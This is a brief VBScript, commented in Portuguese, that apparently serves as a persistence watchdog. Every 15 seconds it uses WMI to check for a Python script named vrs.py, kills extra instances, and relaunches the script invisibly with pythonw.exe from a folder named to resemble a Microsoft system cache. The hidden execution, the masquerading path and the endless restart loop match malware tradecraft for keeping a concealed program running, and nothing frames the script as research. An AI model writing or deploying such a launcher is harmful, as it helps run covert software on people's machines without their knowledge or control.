Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' Caminhos dinâmicos baseados nas variáveis de ambiente do Windows
AppDataLocal = objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
TargetDir = AppDataLocal & "\Microsoft\WindowsCache"
TargetExe = TargetDir & "\vrs.py" ' Altere para .exe caso utilize compilado
PythonExe = "pythonw.exe"

Do
    ' 1. Limpeza de processos duplicados ou travados em excesso
    On Error Resume Next
    Set colProcessos = objWMIService.ExecQuery("Select * from Win32_Process where CommandLine like '%vrs.py%'")
    If colProcessos.Count > 1 Then
        For Each proc in colProcessos
            ' Encerra instâncias excedentes mantendo o controle limpo
            proc.Terminate()
        Next
    End If
    On Error Goto 0

    ' 2. Validação de integridade do arquivo antes de executar
    If objFSO.FileExists(TargetExe) Then
        Set colVerificacao = objWMIService.ExecQuery("Select * from Win32_Process where CommandLine like '%vrs.py%'")
        If colVerificacao.Count = 0 Then
            ' Executa de forma totalmente oculta (0, False)
            objShell.Run PythonExe & " """ & TargetExe & """", 0, False
        End If
    End If

    ' Aguarda 15 segundos antes da próxima checagem
    WScript.Sleep 15000
Loop